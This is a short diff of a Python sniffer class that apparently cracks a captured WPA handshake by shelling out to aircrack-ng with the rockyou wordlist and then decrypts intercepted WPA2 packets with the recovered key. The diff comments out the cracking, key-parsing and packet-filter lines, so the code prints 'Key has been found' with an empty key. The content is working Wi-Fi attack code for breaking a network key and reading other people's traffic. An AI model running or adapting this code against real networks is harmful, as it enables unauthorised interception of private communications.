@@ -43,14 +43,14 @@ class sniffer():
 			self.make_cap()
 
 		print("Cracking the key")
-		os.system("sudo aircrack-ng " + self.dfilepath + "/WPA_{}-01.cap -w ".format(self.mac) + "/home/kali/rockyou.txt>" + self.dfilepath + "key_info.txt")
-		key_file = open(self.dfilepath + "/key_info.txt", "r").read()
-		index = key_file.index("KEY FOUND!") + len('KEY FOUND! [ ')
+#		os.system("sudo aircrack-ng " + self.dfilepath + "/WPA_{}-01.cap -w ".format(self.mac) + "/home/kali/rockyou.txt>" + self.dfilepath + "/key_info.txt")
+#		key_file = open(self.dfilepath + "/key_info.txt", "r").read()
+#		index = key_file.index("KEY FOUND!") + len('KEY FOUND! [ ')
 		self.key = ""
 
-		while key_file[index] != ' ':
-			self.key += key_file[index]
-			index += 1
+#		while key_file[index] != ' ':
+#			self.key += key_file[index]
+#			index += 1
 
 		print("Key has been found: {}".format(self.key))
 		print("Starting to sniff")
@@ -72,7 +72,7 @@ class sniffer():
 
 		encrypted_mess = hexlify(str(packet))
 		unencrypted_mess = WPA2.decrypt_wpa2_data(encrypted_mess, self.key, rounds)
-		unencrypted_mess = self.filter_packets(unencrypted_mess)
+#		unencrypted_mess = self.filter_packets(unencrypted_mess)
 
 		return unencrypted_mess
 
